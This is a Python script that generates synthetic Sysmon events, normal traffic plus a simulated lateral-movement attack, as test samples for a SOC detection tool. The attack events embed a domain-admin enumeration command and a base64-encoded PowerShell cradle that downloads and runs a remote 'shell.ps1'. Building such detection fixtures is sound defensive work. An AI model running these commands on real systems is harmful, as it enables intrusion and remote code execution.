#!/usr/bin/env python3
"""Generate synthetic Sysmon-style events with lateral movement patterns."""

import json
from datetime import datetime, timedelta

base = datetime(2026, 11, 15, 9, 0, 0)
events = []

# ── Normal traffic: workstations talking to file server via SMB ────
normal_srcs = ["10.0.1.10", "10.0.1.11", "10.0.1.12"]
for i, src in enumerate(normal_srcs):
    for minute in range(0, 480, 30):
        ts = base + timedelta(minutes=minute + i * 5)
        events.append({
            "timestamp": ts.isoformat(), "EventID": "3",
            "SourceIp": src, "DestinationIp": "10.0.2.50",
            "DestinationPort": "445",
            "User": f"CORP\\user{i+1}", "Image": "C:\\Windows\\explorer.exe",
        })

# ── Attack: Lateral movement from compromised workstation ─────────
# Step 1: Network — attacker RDP + SMB from 10.0.1.10 to domain controller
attacker_src = "10.0.1.10"
target_dc = "10.0.3.5"
attack_start = base + timedelta(hours=3, minutes=15)

for i in range(5):
    ts = attack_start + timedelta(minutes=i * 2)
    events.append({
        "timestamp": ts.isoformat(), "EventID": "3",
        "SourceIp": attacker_src, "DestinationIp": target_dc,
        "DestinationPort": "445",
        "User": "CORP\\svc_backup", "Image": "C:\\Tools\\psexec.exe",
    })
    events.append({
        "timestamp": (ts + timedelta(seconds=30)).isoformat(), "EventID": "3",
        "SourceIp": attacker_src, "DestinationIp": target_dc,
        "DestinationPort": "5985",
        "User": "CORP\\svc_backup", "Image": "C:\\Windows\\System32\\wsmprovhost.exe",
    })

# Step 2: Process — suspicious parent-child on the DC
for i in range(3):
    ts = attack_start + timedelta(minutes=i * 3 + 1)
    events.append({
        "timestamp": ts.isoformat(), "EventID": "1",
        "Computer": target_dc, "User": "CORP\\svc_backup",
        "ParentImage": "C:\\Windows\\System32\\services.exe",
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c whoami && net group \"Domain Admins\" /domain",
    })
    events.append({
        "timestamp": (ts + timedelta(seconds=10)).isoformat(), "EventID": "1",
        "Computer": target_dc, "User": "CORP\\svc_backup",
        "ParentImage": "C:\\Windows\\System32\\wmiprvse.exe",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA",
    })

# ── Benign process events (admin tooling, should NOT trigger) ─────
for i in range(10):
    ts = base + timedelta(hours=1, minutes=i * 15)
    events.append({
        "timestamp": ts.isoformat(), "EventID": "1",
        "Computer": "10.0.1.11", "User": "CORP\\user2",
        "ParentImage": "C:\\Windows\\explorer.exe",
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c dir",
    })

# ── Single-signal test: RDP from unknown IP, no process evidence ──
rogue_ip = "192.168.99.5"
for i in range(3):
    ts = base + timedelta(hours=5, minutes=i * 10)
    events.append({
        "timestamp": ts.isoformat(), "EventID": "3",
        "SourceIp": rogue_ip, "DestinationIp": "10.0.1.12",
        "DestinationPort": "3389",
        "User": "CORP\\admin_temp", "Image": "C:\\Windows\\System32\\mstsc.exe",
    })

events.sort(key=lambda e: e["timestamp"])
out = "d:\\00 Active\\soc-automations\\tests\\samples\\synthetic_sysmon.json"
with open(out, "w") as f:
    json.dump(events, f, indent=2)

print(f"Generated {len(events)} events → {out}")
print(f"  Normal SMB traffic:   ~48 events")
print(f"  Attack (net+proc):    10 net + 6 proc events → correlated detection")
print(f"  Benign processes:     10 events (should NOT trigger)")
print(f"  Single-signal RDP:    3 events (only with --single-signal)")
